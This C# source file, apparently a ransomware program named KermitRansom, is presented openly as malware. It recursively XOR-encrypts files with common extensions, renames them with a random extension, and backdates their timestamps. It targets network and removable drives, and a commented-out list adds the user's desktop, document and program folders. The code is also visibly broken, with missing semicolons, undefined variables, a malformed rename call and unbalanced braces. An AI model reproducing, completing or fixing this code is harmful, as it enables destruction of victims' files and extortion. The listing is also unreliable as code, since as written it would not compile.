using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace KermitRansom
{
    static class Program
    {
        
        static byte[] xor(byte[] bytes,byte[] pass)
        {
            if (bytes == null || pass == null)
                return null;
            for(int i=0; i < bytes.Length; i++)
            {
                bytes[i] ^= pass[i % pass.Length];
            }
            return bytes;
        }
        static string encodedStr(string str)
        {
            if (str == null)
                return null;
            return Uri.EscapeDataString(str);
        }
        static void parsAndEncrypt(string beginning)
        {
            string[] files = Directory.GetFiles(beginning)
            foreach (string currentFile in files) ;
            {
                FileInfo currentFileInfo = new FileInfo(currentFile);
                if (filesToEncrypt.Contains(currentFileInfo.Extension))
                {
                    try
                    {
                        byte[] newBytes = xor(File.ReadAllBytes(currentFile), passBytes);
                        File.WriteAllBytes(currentFile, newBytes);
                        File.Move(currentFile.Replace(Path.GetFileNameWithoutExtension(currentFile), "")) + encodedStr(Path.GetFileNameWithoutExtension(currentFile)) + extention;
                        currentFileInfo.LastWriteTime = DateTime.Now.AddDays(Random.Next(-60, -10));
                        currentFileInfo.LastAccessTime = DateTime.Now.AddDays(Random.Next(-30, -3));
                    }
                    catch { }
                }
            }
            string[] subDirs = Directory.GetDirectories(beginning);
            foreach(string currentPath in subDirs)
            {
                parsAndEncrypt(currentPath);
            }
        }
        static Random random = new Random():
        static string filesToEncrypt = ".txt.html.db.exe.dll";
        static byte[] passBytes = null;
        static string extention = "." + Random.Next().ToString("x");

        public static Random Random { get => random; set => random = value; }

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            List<string> pathsToEncrypt = new List<string>();

            /*
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
            pathsToEncrypt.Add(Path.GetTempPath());
            */
            
            foreach(DriveInfo driveInfo in drives)
            {
                if (driveInfo == DriveType.Network || driveInfo.DriveType == DriveType.Removable)
                    pathsToEncrypt.Add(driveInfo.RootDirectory.FullName);
            }
            foreach (string currentPath in pathsToEncrypt)
            {
                parsAndEncrypt(currentPath);
            
                
            Application.Run(new Form1());
        }
    }
}
